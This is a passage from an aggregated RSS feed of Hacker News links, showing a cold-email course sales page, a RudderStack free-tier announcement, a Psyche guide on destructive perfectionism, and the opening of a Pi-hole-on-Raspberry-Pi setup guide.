November 12, 2020 | https://philipkiely.com/cefip/ | <a href="https://web.archive.org/web/*/https://philipkiely.com/cefip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<div>
    <!--Intro-->
    <div>
        <p><img src="https://philipkiely.com/assets/img/cefip_hero_vertical.jpg" alt="Cold Email for Interesting People">
        </p>
    </div>
    <div>
        <h2>Cold Email for Interesting People</h2>
        <p>Whether you want a new job, to meet your heroes, a feature on someone's show, or a unique opportunity that the public doesn't know about, the best way to get it is simple: just ask for what you want. I built an international career from the middle of Iowa, thousands miles away from the action. If you're like me and don't have tons of connections, you'll need to cold-contact people who you've never met to get things started. This course equips you with specific tactics for writing successful cold emails and encourages you to take your shot.</p>
        <br>
        <h5>Video Introduction</h5>
        <p>In a short video, I discuss fundamental concepts relating to cold email including social proof, overcoming
            objections, and formulating a specific ask. <i>16 Minutes</i>.</p>
        <br>
        <h5>Handbook</h5>
        <p>The handbook walks step-by-step through the process of deciding to write a cold email, figuring out who to email, finding their contact information, writing a compelling first message, and closing the conversation. <i>31 Pages</i>.</p>
        <br>
        <h5>Six Annotated Examples</h5>
        <p>Go behind the scenes of my cold email success. I've annotated six examples from the past two years to share with you. Each example includes one or two emails, the context, and the
        payoff. For each email, I go through line-by-line and discuss the impact of the words and phrases. <i>48 Pages</i>.</p>
        <br>
    </div>
</div>
<hr>
<div>
    <div>
        <div>
            <div>
                <h2>Get Cold Email for Interesting People Today!</h2>
                
                <p>16 5-star ratings | Pay what you want | $0 Minimum</p>
                <p>Sahil Lavingia: "Cold emails work, when they're sent by interesting people."</p>
                <p><a href="https://gum.co/cefip/">Click Here to Buy Now on Gumroad</a>
            </p></div>
        </div>
    </div>
    <div>
        <blockquote data-theme="dark">
            <p lang="en" dir="ltr">Cold emails work, when they're sent by interesting people.</p>— Sahil (@shl) <a href="https://twitter.com/shl/status/1306575128277299201?ref_src=twsrc%5Etfw">September 17, 2020</a>
        </blockquote>
        
    </div>
</div>
<hr>
<!--ATA SECTION-->
<div>
    
    <div>
        <p><img src="https://philipkiely.com/assets/img/SeatedPortraitCropped.jpg" alt="Philip Kiely">
        </p>
    </div>
    <div>
        <div>
            <p>Hi, I'm Philip Kiely. I run <a href="https://pkandc.com/">Philip Kiely &amp; Company</a>, which means that I am many
                things to many people. Most often, I’m <a href="https://philipkiely.com/essays/gumroad_hom.html">running marketing</a> at <a href="https://gumroad.com/">Gumroad</a>, selling copies of <a href="https://philipkiely.com/wfsd">Writing for Software Developers</a>,
                working on the next big thing, fixing bugs of my own creation, finding and delighting clients, or running payroll
                through Venmo like a Real Business Person.</p>
            <p>You can find me around the internet, especially <a href="https://twitter.com/philip_kiely">Twitter</a>, <a href="https://news.ycombinator.com/user?id=philipkiely">Hacker News</a>, or <a href="https://www.indiehackers.com/philipkiely">Indie Hackers</a>. I write <a href="https://philipkiely.com/essays">essays</a>, <a href="https://philipkiely.com/essays">tutorials</a>, and <a href="https://philipkiely.com/notes">notes</a> on my own site and <a href="https://philipkiely.com/notes/posts.html">various other publications</a>. You may have heard me on <a href="https://www.se-radio.net/2020/09/episode-426-philip-kiely-on-writing-for-software-developers/">IEEE’s
                    Software Engineering Radio</a> or <a href="https://philipkiely.com/notes/appearances.html">another show</a>. My professional hobbies
                include appearing on podcasts and panels, sending cold emails, pretending that I can read a 10-K, and tweeting
                about business. I also enjoy playing D&amp;D, practicing martial arts, and reading whatever is nearby.</p>
        </div>
    </div>
</div>
<hr>
<!--FAQ SECTION-->
<div>
    <div>
        
        <h5>What is a cold email?</h5>
        <p>A cold email is sending an email to someone who you do not know, or do not know well. The "cold" in cold email doesn't
        refer to the tone (which should generally be warm, friendly, and professional), but rather to the lack of previous
        relationship.</p>
        <br>
        <h5>Am I an interesting person?</h5>
        <p>I think so! Whether or not someone is interesting is quite situational. For example, Tom Brady wouldn't be interested in
        hearing from me with ideas for plays to run, but a developer advocate might be interested in hearing from me with ideas
        for technical content. Being interesting isn't so much an attribute but an action, so anyone can be interesting to the right person in the right situation!</p>
        <br>
        <h5>Who is this course not for?</h5>
        <p>This isn't a course about copywriting for mass emails or other bulk outreach. It isn't about generating leads or making
        tons of LinkedIn connections with some boilerplate message. It is about thinking deeply about how to connect with
        individuals about mutually interesting things.</p>
        <br>
    </div>
    <div>
        <h5>How much should I pay?</h5>
        <p><i>Cold Email for Interesting People</i> is a pay-what-you-want product. You can pay any amount, even zero dollars, but I'd appreciate it if you paid for the product for both of our benefits. Paying for the product helps me run my business and makes you more invested in the content. You can also download for free, see if you like it, and then buy it again if you found it valuable.</p>
        <p>I did pay-what-you-want without a minimum to achieve <a href="https://en.wikipedia.org/wiki/Price_discrimination#First_degree">perfect price discrimination</a> and avoid <a href="https://en.wikipedia.org/wiki/Anchoring_(cognitive_bias)">price anchoring</a>. But, if you really want guidance, let's say that if twenty bucks isn't a big deal for you, you should pay about that much, but if twenty bucks is a big deal for you, you should pay five or grab it for free and not feel bad either way. If you know me personally, you get it for free.</p>
        <br>
        <h5>Is there a refund policy?</h5>
        <p>I have a 30-day no-questions-asked refund policy. If you don't like your purchase, let me know and I will refund your
            money. Because the product is pay-what-you-want, if you think you'd ask for a refund, I'd rather you just download for free because that saves us both time.</p>
        <br>
        <h5>What if I have another question?</h5>
        <p>Send me an email at <a href="mailto:philip@kiely.xyz">philip@kiely.xyz</a>.</p>
        <br>
    </div>
</div>
<!--END FAQ SECTION-->
<hr>
<div>
    <div>
        <div>
            <div>
                <h2>Get Cold Email for Interesting People Today!</h2>
                
                <p>16 5-star ratings | Pay what you want | $0 Minimum</p>
                <p>Watch the Video Introduction on YouTube</p>
                <p><a href="https://gum.co/cefip/">Click Here to Buy Now on
                    Gumroad</a>
            </p></div>
        </div>
    </div>
    <p>
        <iframe width="100%" height="315" src="https://www.youtube.com/embed/E4_WFCF4zLs" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
    </p>
</div>
<hr>
</div></div>]]>
            </description>
            <link>https://philipkiely.com/cefip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069895</guid>
            <pubDate>Thu, 12 Nov 2020 14:02:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Launching RudderStack Cloud Free Tier]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069882">thread link</a>) | @soumyadeb
<br/>
November 12, 2020 | https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/ | <a href="https://web.archive.org/web/*/https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                                    <figure>
                        <img src="https://3od2tt2mz35tibwwgb36eab1-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/freetier.blog_.rs_.png" alt="" title="freetier.blog.rs">                    </figure>
                                
                                
                <section>
                    <div>
                        
<p>Today, we launched <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a>, a no time limit, no credit card required, completely free tier of RudderStack Cloud. The driving force behind this is simple: we want you to try RudderStack, and RudderStack Cloud Free makes it easier than ever to do that. You receive the same great experience you get with RudderStack Cloud Pro, with the only limitation being a cap of 500,000 events per month (that’s roughly 10,000 monthly active users for most sites and apps). We are confident that if you try RudderStack, you will find value in it and love it.</p>











<h2>RudderStack’s Warehouse-First Approach is Better Than Other CDPs</h2>











<p>The whole point of your customer data platform (CDP) is to eliminate the customer data silos that are invariably created through your company’s use of a variety of common, popular marketing, sales, and product technologies. Every CDP <em>claims</em> to do this, and modern CDPs, like Segment, actually do this well, but they all have one glaring flaw in their approach. They create another customer data silo, because they store your data. That means you have a third-party data warehouse for your customer data in addition to your own data warehouse, where you store all of your historical data… including another copy of your customer data.</p>



<blockquote><p><strong>RudderStack’s warehouse-first approach fixes this flaw.</strong>&nbsp;</p></blockquote>



<p>RudderStack does not persist any of your customer data. RudderStack builds your CDP on your data warehouse, with support for cloud data warehouses like <a href="https://aws.amazon.com/redshift/">Amazon Redshift</a>, <a href="https://cloud.google.com/bigquery">Google BigQuery</a>, and <a href="https://www.snowflake.com/">Snowflake</a>. No more paying your CDP vendor a premium to store your data. No more concerns about whether your CDP vendor is keeping your customer data private and secure. No more crossing your fingers and hoping the BI, ML, or AI tools you already use and love work with your CDP. No more reliance on your CDPs black box for complex functions like identity stitching.</p>











<h2>RudderStack is Built for Developers</h2>











<p>The team that owns your data warehouse and data infrastructure should own your customer data stack too. At pretty much every company, that team primarily consists of developers. So we built RudderStack to be easy to use for devs.</p>



<div><p>RudderStack’s features are built API-first, so they can easily fit into your existing development processes. It offers <a href="https://docs.rudderstack.com/rudderstack-sdk-integration-guides">11 SDKs</a> in addition to <a href="https://docs.rudderstack.com/sources">source integrations</a> with popular cloud-based customer tools including <a href="https://looker.com/">Looker</a> and <a href="https://customer.io/">Customer.io</a>, so you can instrument and start ingesting customer data from all of your digital touchpoints. RudderStack also offers connections to over <a href="https://docs.rudderstack.com/destinations">60 destinations</a>, so you can route your customer data to all of the systems that need it&nbsp; – including popular event-streaming platforms like <a href="https://kafka.apache.org/">Apache Kafka</a>, data warehouses like Snowflake, cloud tools like <a href="https://amplitude.com/">Amplitude</a>, <a href="https://www.appsflyer.com/">AppsFlyer</a>, and many more.</p><p>RudderStack is <a href="https://docs.rudderstack.com/how-to-guides/rudderstack-migration-guide">fully compatible</a> with Segment’s API too. So, if you have already instrumented your digital touchpoints with Segment, you don’t have to go through the toil of reinstrumenting with RudderStack. Just update the configuration on your Segment SDKs and you’re done.</p><p>RudderStack is also open source (visit <a href="https://github.com/rudderlabs">RudderStack on GitHub</a>). So if you ever need to augment or modify your RudderStack, you can, and then, hopefully, you’ll contribute that back to the project, so others benefit from your work too.</p></div>











<h2>Start Building a Better CDP With RudderStack</h2>











<p>Start building a better, warehouse-first CDP that delivers complete, unified data to every part of your marketing and analytics stack. Sign up for <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a> today.<br>Join our <a href="https://resources.rudderstack.com/join-rudderstack-slack">Slack</a> to chat with our team, check out our open source repos on <a href="https://github.com/rudderlabs">GitHub</a>, and follow us on social: <a href="https://twitter.com/RudderStack">Twitter</a>, <a href="https://www.linkedin.com/company/rudderlabs/">LinkedIn</a>, <a href="https://dev.to/rudderstack">dev.to</a>, <a href="https://rudderstack.medium.com/">Medium</a>, <a href="https://www.youtube.com/channel/UCgV-B77bV_-LOmKYHw8jvBw">YouTube</a>.</p>
                    </div>
                </section>
            </article><div>
                <div>
                                        <p><img src="https://3od2tt2mz35tibwwgb36eab1-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/Gavin-Headshot-20200907-08-Square.png">
                    </p>
                    <p><span>Gavin</span>
                                                                            <span>Johnson</span>
                                                                    </p>
                    
                </div>
                <p>
                                            Product Marketer at RudderStack. 
Ex-PMM at New Relic &amp; AT&amp;T. Ex-consultant at Deloitte. Ex-sys admin. (Sometimes) Ex-developer.                                    </p>
            </div></div>]]>
            </description>
            <link>https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069882</guid>
            <pubDate>Thu, 12 Nov 2020 14:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to get over ‘never good enough’]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25069727">thread link</a>) | @CapitalistCartr
<br/>
November 12, 2020 | https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>â€˜If itâ€™s worth doing, itâ€™s worth doing well.â€™ How many times did I hear that growing up? My parents were attempting to teach me (just in case I hadnâ€™t absorbed it from their actions) the importance of striving for excellence. They were encouraging what some psychologists call â€˜constructive perfectionismâ€™ or â€˜healthy perfectionismâ€™ â€“ a personality trait thatâ€™s associated with finding enjoyment and even fulfilment in life from doing things as well as you possibly can. With constructive or â€˜positive perfectionismâ€™, the focus is process-oriented; you learn from mistakes or even failure. Itâ€™s generally considered a beneficial trait thatâ€™s linked with being more conscientious and self-disciplined.</p>
<p>Yet perfectionism can have a darker side. The American academic and author BrenÃ© Brown defined this kind of perfectionism in her first <a href="https://www.hazelden.org/HAZ_MEDIA/2545_GiftsofImperfection.pdf" rel="nofollow noreferrer noopener">book</a>, <em>The Gifts of Imperfection</em> (2010), as â€˜a self-destructive and addictive belief system that fuels this primary thought: if I look perfect, live perfectly, and do everything perfectly, I can avoid or minimise the painful feelings of shame, judgment and blame.â€™ This form of perfectionism, which is fuelled by inner shame that must be quelled, involves trying to constantly meet perceived expectations of what â€˜perfectâ€™ is. This perfectionism isnâ€™t fulfilling and itâ€™s far from enjoyable. Yet many people feel itâ€™s mandatory to look as if all <em>is</em> perfect. They believe that not to do so would imply imperfection.</p>
<p>This is whatâ€™s <a href="https://psycnet.apa.org/record/1996-14509-001" rel="nofollow noreferrer noopener">known</a> in the wider psychological literature as â€˜unhealthy perfectionismâ€™ or â€˜destructive perfectionismâ€™. In this case, the purpose has nothing to do with process. Itâ€™s goal-oriented. Itâ€™s driven. Itâ€™s pressured. And I believe itâ€™s increasingly contributing to mental health problems.</p>
<p>Constructive perfectionists, letâ€™s say if theyâ€™re swimmers, want to beat their personal best. That brings with it all kinds of positive vibes. Winning the race is great, if indeed they do.</p>
<p>But destructive perfectionists want to be the perfect swimmer. And winning <em>every</em> race is the goal; if not, shame says to them that they have little to no value or worth.</p>
<p>Many perfectionistic people will fall somewhere on a spectrum between the two poles. But in my clinical practice Iâ€™ve noticed another issue. Ironically, destructive perfectionists might not even recognise themselves as perfectionists, because they never believe their best is good enough. Thereâ€™s always the next achievement. And then the next. And the next.</p>
<p>So, what are the roots of destructive perfectionism? I believe people often develop this way of thinking and being when they grow up without a sense of support, safety and nurturing. It can also be a reaction to childhood trauma or extreme cultural expectations, where appearing perfect becomes a mandatory strategy to emotionally survive, and where vulnerability is disdained.</p>
<p>Over the past decade, Iâ€™ve treated more and more people who didnâ€™t quite know why theyâ€™d come to therapy. Theyâ€™d erected huge barriers against revealing any kind of emotional pain; I wondered if they even had the capability of expressing such feelings. Outwardly, they didnâ€™t seem depressed at all; the descriptions of their issues sounded more like the result of overwork, fatigue or mild anxiety.</p>
<p>My interpretation is that they were destructive perfectionists who were running out of steam, but not sure what, if anything, was wrong. Their emotional pain was expertly, and often unconsciously, hidden.</p>
<p>If I asked them if they were depressed, Iâ€™d hear a firm denial. â€˜I have too many blessings in my life.â€™ If I questioned whether or not their childhood provided safety and security, theyâ€™d laugh and deny or discount any kind of problem. Or sometimes theyâ€™d become very quiet and look out the window, as if they wished they were anywhere but my office.</p>
<p>Yet as they returned for more sessions, theyâ€™d slowly risk sharing one shame-filled secret after another. Their seemingly impenetrable cloak of silence would slowly slip off, only to reveal tremendous loneliness and despair.</p>
<p>And in many cases, as they let down their guard, I found they could also understand that what was â€˜wrongâ€™ or unhealthy might not fit the rubric of classic depression. But it was just as real. And just as damaging.</p>
<p>I began researching the popular literature about perfectionism, shame and fear of vulnerability. I found a wealth of <a href="https://www.guilford.com/books/Perfectionism/Hewitt-Flett-Mikail/9781462528721/authors" rel="nofollow noreferrer noopener">research</a> and writings about the importance of vulnerability and the cost of shame by the aforementioned Brown, the much earlier thoughts on â€˜covert depressionâ€™ by the author and family therapist Terrence Real, and the <a href="https://www.harpercollins.com/products/self-compassion-kristin-neff?variant=32205936885794" rel="nofollow noreferrer noopener">book</a> <em>Self-Compassion</em> (2015) by the psychologist Kristin Neff. But crucially I couldnâ€™t find anything for the general public about the relationship between perfectionism and a form of potentially serious depression.</p>
<p>So, drawing on the experiences and stories of the many clients Iâ€™ve seen in my practice over 25 years, I formulated my own ideas about this distinct problem and how it can be addressed most effectively and compassionately. My work â€“ laid out in my <a href="https://drmargaretrutherford.com/perfectlyhiddendepressionbook/" rel="nofollow noreferrer noopener">book</a> <em>Perfectly Hidden Depression</em> (2019) â€“ is based on how a dangerous kind of perfectionism-fuelled depression can affect someoneâ€™s life; how even if someone scores low on a standard depression inventory, they can be living with deep-seated emotional difficulties and unresolved traumatic experiences that might ultimately threaten their will to live. This is the syndrome I call â€˜perfectly hidden depressionâ€™.</p>
<p>Iâ€™ve identified 10 traits that manifest in the daily decision-making and behaviour of people who exhibit signs of this syndrome:</p><ul>
<li>You are highly perfectionistic, fuelled by a constant, critical inner voice of intense shame or fear.</li>
<li>You demonstrate a heightened or excessive sense of responsibility and look for solutions.</li>
<li>You have difficulty accepting and expressing painful emotions, remaining more analytical or â€˜in your headâ€™.</li>
<li>You discount, dismiss or deny abuse or trauma from the past, or the present.</li>
<li>You worry a great deal (but hide that habit) and avoid situations where youâ€™re not in control.</li>
<li>You are highly focused on tasks and othersâ€™ expectations, using accomplishment as a way to feel validated. Yet as the last accomplishment fades, new pressure assumes itself, and any success is discounted.</li>
<li>You have an active and sincere concern for the wellbeing of others, while allowing few (if any) into your inner world.</li>
<li>You hold a strong belief in â€˜counting your blessingsâ€™ and feel that any other stance reflects a lack of gratitude.</li>
<li>You have emotional difficulty with personal intimacy but demonstrate significant professional success.</li>
<li>You might have accompanying mental health issues that involve anxiety and control issues, such as obsessive-compulsive disorder (OCD), generalised anxiety disorder (GAD), panic and/or eating disorders.</li>
</ul><p>If you read these 10 traits and find that many or all of them match you, then hopefully this is in some sense reassuring â€“ it might give you an inkling of why you feel the way you do, how you havenâ€™t known what was wrong and have been ashamed to even consider it. If suddenly a light has come on â€“ you recognise that you canâ€™t bring yourself to share any vulnerability; or perhaps you recognise these traits in someone else, then first â€“ breathe. And know this: Iâ€™ve found there is an antidote to perfectly hidden depression â€“ self-acceptance.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>If you believe that you are an unhealthy perfectionist and that it could be masking your own deep-rooted emotional problems, I propose five stages that can help you: consciousness, commitment, confrontation, connection and change.</p>
<p><strong>The first stage: consciousness</strong></p>
<p>This stage refers to the importance of becoming aware that your perfectionism is a problem in the first place. Although recognising oneâ€™s problems is a part of every emotional/mental healing process, this stage might be especially complicated for you because youâ€™ve convinced yourself that your perfectionist traits are normal or not a problem. â€˜Isnâ€™t everyone like this?â€™ you might wonder. The answer to that is a resounding â€˜noâ€™. Yet giving up or tweaking a strategy thatâ€™s brought you external success is likely to be very difficult. In fact, the process of avoiding any painful feelings and memories might have become something you do unconsciously.</p>
<p>There are various ways to develop more insight into the role that destructive perfectionism is playing in your life, but one exercise that you can try on your own is mindfulness. Mindfulness authors teach that itâ€™s not a process where you have to ensure youâ€™re always focusing intently on something. Mindfulness is more about changing <em>how</em> youâ€™re paying attention. Mindfulness deepens your experience of the present.</p>
<p>Hereâ€™s one simple mindfulness technique: sit somewhere comfortable and set a timer for three to five minutes. Breathe deeply and close your eyes. Stay as focused on your breaths as possible, even counting them from one to 10, and then starting over. If your mind wanders (which it will), gently let go of those thoughts and refocus on the breath. When the timer goes off, check in with your emotions, your eyes still closed. There could be irritation, relief, feeling silly. Simply notice and watch them dissipate.</p>
<p>Becoming conscious takes patience. The more you practise mindfulness, youâ€™ll begin to notice more about <em>how</em> youâ€™re interacting with both your external and internal worlds, including developing greater insight into how needing to seem perfect has seeped into almost all aspects of your life.</p>
<p><strong>The second stage: commitment</strong></p>
<p>As you become more aware of the problems perfectionism is causing you, you might still find that changing is hard. Ironically (and destructively) this can morph into another goal for you to reach perfectly. Iâ€™ve found that there are five major stumbling blocks to challenging perfectionismâ€™s grasp on your …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide">https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069727</guid>
            <pubDate>Thu, 12 Nov 2020 13:42:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remove ads from your life using Raspberry Pi, Docker and Docker Compose]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25069717">thread link</a>) | @karakanb
<br/>
November 12, 2020 | https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/ | <a href="https://web.archive.org/web/*/https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<header>
<time datetime="2020-10-12T00:00:00+00:00">October 12, 2020</time>
</header>
<p>I need to start this article with some simple disclaimers: I love Raspberry Pi, I love Docker, I don’t love networking that much (spoiler alert: I suck at it).</p>
<ul>
<li>I love Raspberry Pi because it is a tiny, fully functioning computer that gives me goosebumps. It is one of those things that makes you feel like <a href="https://en.wikipedia.org/wiki/Mr._Robot">Mr. Robot</a>. It is relatively cheap, it is accessible, and there are tons of guides online to do pretty much anything you can imagine.</li>
<li>I love Docker because it is a simple way of running various pieces of software in a standardized way: you pull the Docker image for your platform, you run the image with a single command and that’s it! You can glue things together, you can add your own images, you can share your configuration, you can run the same setup on different machines, and you can destroy things easily once you don’t need them anymore. I am not saying it is the simplest software ever, but it is relatively easy to play around with.</li>
<li>I don’t love networking much, simply because I suck at it. I have a basic understanding of high-level concepts about many parts of it, but they don’t always translate to how things work in real life. I roughly know how computers communicate over a network, but I quickly get lost when I need to debug a bad connection for example. The good thing is that it means I’ll aim to keep this guide as simple as possible so that I can understand it as well.</li>
</ul>
<p>So, since we are done with the disclaimers, let’s touch on the basics a bit before we get on with the guide. If you know all the tools and technologies mentioned above, feel free to skip that part.</p>

<p>Since we’ll need to get a bit technical in the article, there are a couple of things we need to clarify so that there will be less confusion moving forward. I’ll try to be brief here, and add some reading material in case you’d like to learn more.</p>
<h2 id="what-is-raspberry-pi">What is Raspberry Pi?</h2>
<p>Raspberry Pi is a simple, single-board computer that is originally developed for educational purposes; however, the board has become widely popular among makers and has been very popular for many use-cases including robotics, home automation, and IoT. The first one being launched in February 2012, the Raspberry Pi has 4 generations as of today, the latest one being the most advanced one including a Quad-core ARM processor and up to 8GB RAM. The latest version of it starts from $35 and goes up to $75; not super cheap, but a good price for a general-purpose computer.</p>
<p>Think of Raspberry Pi as a simple desktop computer without any screens or peripherals attached. You can connect screens to it, you can connect your keyboard, mouse, ethernet, and use it as a regular computer. There are tons of use-cases that don’t need these peripheral devices, therefore it is common to see Raspberry Pi devices being used inside handheld devices, or hidden in an office space as a network device, or whatever. It is a general-purpose computer, and your imagination is the limit here.</p>
<p>The device looks like this:</p>
<p><img src="https://burakkarakan.com/blog/assets/images/pihole-docker/raspberry-pi.png" alt="Raspberry Pi 4, [from the official Raspberry Pi website](https://www.raspberrypi.org/products/raspberry-pi-4-model-b/)"></p>

<p>They also have an even-cheaper and smaller version of the same family, Raspberry Pi Zero W, which has fewer resources than the regular Pi, but it is even smaller than the regular ones, making it suitable for IoT applications and mobile use-cases. The current selling price for the Zero W is <a href="https://www.raspberrypi.org/products/raspberry-pi-zero-w/">$10</a>.</p>
<p><img src="https://burakkarakan.com/blog/assets/images/pihole-docker/raspberry-pi-zero.jpg" alt="Raspberry Pi Zero, [from raspberrypi-spy.co.uk](https://www.raspberrypi-spy.co.uk/2015/11/introducing-the-raspberry-pi-zero/)"></p>

<p>All the Raspberry Pi devices are capable of running various operating systems (OS) depending on the specific model you have; however, the most common operating system for Raspberry Pi is <a href="https://www.raspberrypi.org/downloads/raspberry-pi-os/">Raspberry Pi OS</a>, Raspbian with its old name. It is based on Debian, has a bunch of simple installers, and it is a good starting point for tinkering with the Pi. I strongly recommend going with the Pi OS if you are just getting started with the ecosystem, it’ll definitely simplify your journey in the beginning in terms of finding documentation and help online.</p>
<p>For learning more about the Raspberry Pi, head over to the official <a href="https://www.raspberrypi.org/">Raspberry Pi website</a>.</p>
<h2 id="what-is-pi-hole">What is Pi-hole?</h2>
<p><a href="https://pi-hole.net/">Pi-hole</a> is a plug-and-play software that offers network-wide <a href="https://en.wikipedia.org/wiki/DNS_sinkhole">DNS sinkhole</a> for filtering out content for all the devices connected to the same network. In simple terms: when your browser tries to connect a server to show you some content on a website, Pi-hole will resolve the IP address for that host into a blackhole IP address if it is on a blocklist, meaning that your computer will not reach the ad server, and as a result, you won’t see ads. This has a bunch of benefits for the end-user:</p>
<ul>
<li>There is no need to install specific software to any of the devices connected to the network, and all of your devices can benefit from this, including your smart TV and mobile devices.</li>
<li>This allows blocking not only the traditional ads on websites but also the in-app ads that are embedded in other places, such as the operating system of your smart TV.</li>
<li>Since the request for the ad content will never leave your network, nothing will be downloaded, and your network performance will improve.</li>
<li>It also blocks some trackers, which means it automatically provides better privacy while you are surfing.</li>
</ul>
<p>All in all, Pi-hole is a neat piece of open-source software that gives you better visibility and control into the ad traffic that is happening in your network. For more details, go ahead and visit their <a href="https://pi-hole.net/">website</a>, as well as their <a href="https://github.com/pi-hole">GitHub organization</a> for checking the source code and learning more about the project.</p>
<h2 id="what-is-docker">What is Docker?</h2>
<p>The poster-child for the cloud-native era, Docker has been a very popular software in the last couple of years. It is essentially a nicely packaged system that simplifies managing containers on many different operating systems, and it is the de-facto standard engine for running containers. It allows you to package your application and its dependencies in a simple format and share them. You can head over to the following link to learn more about Docker (spoiler alert: I wrote the article):
<a href="https://medium.com/swlh/what-exactly-is-docker-1dd62e1fde38"><strong>What Exactly is Docker?</strong></a></p>

<p>So, I wanted to set up Pi-hole on my home network, and I had a <a href="https://www.raspberrypi.org/products/raspberry-pi-3-model-b-plus/?resellerType=home">Raspberry Pi 3 Model B+</a> lying around. I had a couple of goals before I started the setup:</p>
<ul>
<li>I wanted to be able to manage the device remotely; meaning that all I need to change things there should be a working network connection to the device, and since I’ll start with my home network, that’ll be a given anyway. I don’t want to depend on keyboards, screens, or other peripherals to be able to play with it.</li>
<li>I wanted to utilize the same Pi for my other use-cases such as home automation; therefore, I wanted to keep the Pi installation as clean as possible, in case I’d need to rebuild the same setup using a different device, or if I need to do a clean install on another storage device.</li>
<li>I wanted to be able to keep my setup in a Git repo in order to be able to keep track of my changes and have a backup, because, why not?</li>
<li>I wanted the setup to be easy to reproduce in other devices and networks so that I can set it up for my family and friends as well.</li>
<li>I wanted to be able to extend my setup with other use-cases, hopefully with some sort of automation to deploy my changes to the Pi. I can always connect to the Pi and install whatever I need manually, but this would contradict my previous goal to make the setup easy to reproduce.</li>
</ul>
<p>For some of you, these goals might be irrelevant, and that’s totally fine. I just wanted to aim for these and learn to try to achieve them.</p>
<p>In the end, I decided to go for a simple Pi OS Lite setup with Docker &amp; Docker Compose to manage Pi. The reason I picked the Lite OS is that I didn’t need a desktop environment and the other software that comes with the default Raspberry Pi OS, such as games or office software. The reason I decided on Docker is that I wanted to be able to run everything as containers on the device to not to depend on manual installation and the dependency hell, and Docker Compose is to be able to define all the things I’ll run in a simple YAML format that I can keep in the version control. In addition, relying on Docker from the beginning enables me for future adventures in case I want to go there, such as <a href="https://magpi.raspberrypi.org/articles/build-a-raspberry-pi-cluster-computer">building clusters</a> or <a href="https://ubuntu.com/tutorials/how-to-kubernetes-cluster-on-raspberry-pi#1-overview">running Kubernetes on Raspberry Pis.</a> Of course, these are not requirements, just potential ideas for my amusement.</p>
<p>As I have mentioned before, this doesn’t mean that you have to run this very same setup for your installation; it just happened to be the one I chose. The rest of the article will be about getting this configuration up and running, so, follow along if you are still interested.</p>

<p>Our requirements for the project is relatively simple:</p>
<ul>
<li>A primary computer to manage the whole installation in your network.</li>
<li>A working internet connection.</li>
<li>A router with ethernet ports. You can also use the built-in Wi-Fi some models have, although it will perform better if you use a cable connection.</li>
<li>A Raspberry Pi, I’d imagine any model would do the job here.</li>
<li>A MicroSD card for installing the operating system. If you already have an installed one, that’s also fine, it shouldn’t matter much which OS you have.</li>
</ul>
<p>The rest of the article will assume that you meet these requirements on your part.</p>
<p>The steps we’ll take are:</p>
<ul>
<li>Setup the SD-card for booting the device</li>
<li>Connect the Pi to your router, and access the internet</li>
<li>Install Docker</li>
<li>Run Pi-hole using Docker &amp; Docker Compose</li>
<li>Replace your router’s DHCP server with the Pi-hole DHCP server</li>
<li>That’s it!</li>
</ul>
<p>Let’s get started.</p>
<h2 id="before-you-go-on">Before you go on</h2>
<p>One thing to keep in mind is: Pi-hole cannot remove all the ads from all the websites. Blocking ads is simply a cat-mouse game, and Pi-hole is trying to disable them on the DNS level, meaning that you should still keep your blocker extensions on your browser for a good experience. Pi-hole will definitely contribute to your overall experience but do not get pissed off if it doesn’t remove all the ads, some ads are practically impossible to get rid of without significant effort.</p>
<p>If you are looking for a blocker extension, I recommend the open-source <a href="https://github.com/gorhill/uBlock">uBlock Origin</a>: here’s for <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en">Google Chrome</a> and here’s for <a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/">Mozilla Firefox</a>.</p>

<p>You can skip this section if you already have a …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/">https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/</a></em></p>]]>
            </description>
